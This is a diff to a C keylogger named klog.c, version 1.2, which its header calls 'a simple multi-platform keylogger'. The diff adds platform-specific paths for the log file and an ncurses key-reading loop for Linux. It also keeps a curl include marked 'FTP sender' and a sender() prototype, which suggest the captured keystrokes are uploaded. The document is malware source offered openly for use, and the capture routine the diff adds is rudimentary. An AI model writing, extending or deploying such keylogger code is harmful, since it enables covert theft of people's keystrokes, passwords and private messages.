@@ -2,26 +2,27 @@
  ===============================================================================
  Name        : klog.c
  Author      : Fastiraz
- Version     : 1.1
+ Version     : 1.2
  Copyright   : Your copyright notice
- Description : A simple keylogger in C.
+ Description : A simple multi-platform keylogger in C.
  Compile     : cl klog.c user32.lib
  Usage       : ./klog.exe
  ===============================================================================
  */
 
 /*============================================================================*/
+#if defined(_WIN32) || defined(_WIN64)
+    #include <windows.h>
+    #include <conio.h>
+    #define PATH "C:/Users/Administrator/Desktop/klog.txt"
+#elif defined(__linux__) || defined(__APPLE__)
+    #include <ncurses.h>
+    #define PATH "/home/user/klog.txt" // Linux
+#endif
+
 #include <stdio.h>
-#include <conio.h>
-#include <windows.h>
 #include <time.h>
 #include <curl/curl.h> // FTP sender
-/*============================================================================*/
-
-/*============================================================================*/
-//#define PATH "C:/Users/Administrator/Desktop/klog.txt"
-#define PATH "C:\\Users\\Fastiraz\\Documents\\Dev\\C\\klog\\klog.txt"
-//#define PATH "/home/user/klog.txt" // Linux
 /*============================================================================*/
 
 /*============================================================================*/
@@ -35,13 +36,11 @@ int sender(const char *path);
 int main() {
     #ifdef _WIN32
         winklog();
+    #elif defined(__linux__) || defined(__APPLE__)
+        linklog();
     #else
-        #if defined(__linux__) || defined(__APPLE__)
-            linklog();
-        #else
-            printf("Error: unsupported operating system\n");
-            exit(1);
-        #endif
+        printf("Error: unsupported operating system\n");
+        exit(1);
     #endif
 
     return 0;
@@ -74,6 +73,22 @@ int winklog(){
 /*============================================================================*/
 int linklog(){
     printf("En dev..."); // Linux klog
+    initscr();
+    cbreak();
+    noecho();
+    keypad(stdscr, TRUE);
+
+    while (1)
+    {
+        int ch = getch();
+        if (ch != ERR)
+        {
+            printw("Key %c was pressed\n", (char)ch);
+            refresh();
+        }
+    }
+
+    endwin();
 }
 /*============================================================================*/
 
